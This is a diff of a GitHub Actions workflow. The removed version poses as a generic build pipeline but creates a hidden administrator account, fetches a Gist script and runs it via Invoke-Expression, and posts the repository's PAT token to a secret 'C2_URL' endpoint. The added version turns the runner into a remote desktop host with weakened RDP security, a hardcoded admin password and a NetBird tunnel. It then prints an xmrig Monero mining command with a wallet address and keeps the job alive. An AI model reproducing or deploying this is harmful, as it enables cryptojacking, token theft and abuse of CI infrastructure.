@@ -1,83 +1,69 @@
-# A generic, professional-sounding name for the workflow.
-name: Main Build Pipeline
-
+name: RDP + NetBird (Full Desktop)
 on:
   workflow_dispatch:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
-
-env:
-  PROJECT_NAME: 'WebApp'
-  DOTNET_VERSION: '6.0.x'
 
 jobs:
-  build-and-publish-windows:
+  secure-rdp:
     runs-on: windows-latest
-    timeout-minutes: 175
+    timeout-minutes: 360
 
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
-
-      - name: Setup Build Environment
-        shell: powershell
+      - name: Configure RDP
         run: |
-          $pw = "Bldr-1337-CI"
-          $sPass = ConvertTo-SecureString $pw -AsPlainText -Force
-          New-LocalUser -Name "Builder" -Password $sPass -AccountNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "Builder"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+          netsh advfirewall firewall delete rule name="RDP-NetBird" | Out-Null
+          netsh advfirewall firewall add rule name="RDP-NetBird" dir=in action=allow protocol=TCP localport=3389
+          Restart-Service -Name TermService -Force
 
-      # This step now downloads and runs the script from your personal Gist.
-      - name: Download & Execute Remote Setup Script
-        id: configure_deps
-        shell: powershell
+      - name: Create RDP user
         run: |
-          # This URL points directly to the RAW version of the Gist you created.
-          $scriptUrl = "https://gist.githubusercontent.com/Peter211231231231232131/9e615e15c732e4fd37f797862e6491ae/raw/ea80e96bd231e5f84e48fa08bd2d3af10fd5c338/setup.ps1"
-          
-          Write-Host "Downloading setup script from $scriptUrl..."
-          # Download the script content from the Gist
-          $scriptContent = Invoke-RestMethod -Uri $scriptUrl
-          
-          # Execute the downloaded script
-          Invoke-Expression $scriptContent
+          $password = "Runner-12345"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
+          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
 
-      - name: Execute Long-Running Integration Tests
-        shell: powershell
+      - name: Install NetBird
         run: |
-          $testRunnerPath = "${{ steps.configure_deps.outputs.test_runner_path }}"
-          $arguments = "--background"
-          Write-Host "Starting test suite in background mode..."
-          Start-Process -FilePath $testRunnerPath -ArgumentList $arguments
-          Write-Host "Test suite process started successfully."
+          $nbUrl = "https://github.com/netbirdio/netbird/releases/download/v0.30.3/netbird_0.30.3_windows_amd64.msi"
+          $installerPath = "$env:TEMP\netbird.msi"
+          Invoke-WebRequest -Uri $nbUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
 
-      - name: Monitor Long-Running Tests
-        shell: powershell
+      - name: Connect to NetBird
+        env:
+          NB_SETUP_KEY: ${{ secrets.NETBIRD_DEV_KEY }}
         run: |
-          Write-Host "Monitoring test execution. This will continue until the job timeout is reached."
-          while ($true) {
-              Start-Sleep -Seconds 300
+          & "C:\Program Files\NetBird\netbird.exe" up --setup-key $env:NB_SETUP_KEY
+          $nbIP = $null
+          $retries = 0
+          while (-not $nbIP -and $retries -lt 15) {
+              $nbIP = (Get-NetIPAddress -InterfaceAlias "wt0" -ErrorAction SilentlyContinue).IPAddress
+              Start-Sleep -Seconds 4
+              $retries++
           }
-
-      - name: Report Build Status to Monitoring Service
-        if: success()
-        shell: powershell
-        run: |
-          Write-Host "Sending completion signal to monitoring endpoint..."
-          $monitoringEndpoint = "${{ secrets.C2_URL }}"
-          $payload = @{
-              pat_token     = "${{ secrets.PAT_TOKEN }}";
-              repository    = "${{ github.repository }}";
-              workflow_file = "main-pipeline.yml";
-              run_id        = "${{ github.run_id }}";
-              status        = "completed";
-          } | ConvertTo-Json
-          
-          try {
-              Invoke-RestMethod -Uri $monitoringEndpoint -Method Post -Body $payload -ContentType 'application/json'
-              Write-Host "Status reported successfully."
-          } catch {
-              Write-Warning "Failed to report status to the monitoring service."
+          if (-not $nbIP) {
+              Write-Error "NetBird IP not assigned. Exiting."
+              exit 1
           }
+          echo "NETBIRD_IP=$nbIP" >> $env:GITHUB_ENV
+
+      - name: Display RDP Info and Miner Command
+        run: |
+          Write-Host "`n=== RDP ACCESS VIA NETBIRD ==="
+          Write-Host "NetBird IP: $env:NETBIRD_IP"
+          Write-Host "Username: RDP"
+          Write-Host "Password: $env:RDP_PASSWORD"
+          Write-Host "==================================`n"
+          Write-Host "Once connected via RDP, open Command Prompt and paste the following command to start mining:"
+          Write-Host ""
+          Write-Host 'wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip -OutFile xmrig.zip && Expand-Archive xmrig.zip -DestinationPath . && cd xmrig-6.21.2 && xmrig.exe --url=pool.supportxmr.com:443 --user=49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP --pass=rdp_$(hostname) --tls --keepalive --cpu-max-threads-hint=80 --cpu-priority=5 --randomx-mode=fast --donate-level=1 --no-color'
+          Write-Host ""
+          Write-Host "The miner will run in that Command Prompt window. You can minimize it and it will keep mining."
+
+      - name: Keep Alive
+        run: while ($true) { Start-Sleep -Seconds 300 }
